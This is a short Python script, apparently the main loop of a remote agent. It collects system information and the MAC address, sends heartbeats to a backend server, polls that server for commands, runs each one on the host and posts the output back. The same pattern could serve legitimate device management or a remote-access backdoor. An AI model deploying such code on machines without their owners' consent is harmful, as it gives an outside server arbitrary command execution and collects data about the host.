import time
from datetime import datetime

import requests
from utils.network_handler import backend_url
from utils.utils import get_mac_address1,collect_system_info,send_system_info_and_heartbeat,execute_command

if __name__ == "__main__":
    last_data_sent = time.time()
    last_heartbeat_sent = time.time()
    try:
        while True:
            # Get current time
            current_time = time.time()

            if current_time - last_data_sent >= 50:
                system_info = collect_system_info()
                send_system_info_and_heartbeat(system_info, None, backend_url)
                last_data_sent = current_time

            # Send heartbeat every 1 minute
            if current_time - last_heartbeat_sent >= 60:
                heartbeat = {"mac_address": get_mac_address1(), "time_stamp": datetime.now().isoformat()}
                send_system_info_and_heartbeat(None, heartbeat, backend_url)
                last_heartbeat_sent = current_time
                
            # Check for commands from the server and execute them
            try:
                response = requests.get(backend_url + "/get_commands")
                response.raise_for_status()
                commands = response.json()
                for command in commands:
                    output = execute_command(command)
                    # Send the output back to the server
                    response = requests.post(backend_url + "/send_output", json={"output": output})
                    response.raise_for_status()
            except Exception as e:
                print(f"Error executing commands: {e}")

            time.sleep(1)  # Sleep for 1 second to avoid high CPU usage
    except KeyboardInterrupt:
        print("Loop stopped by user.")
    
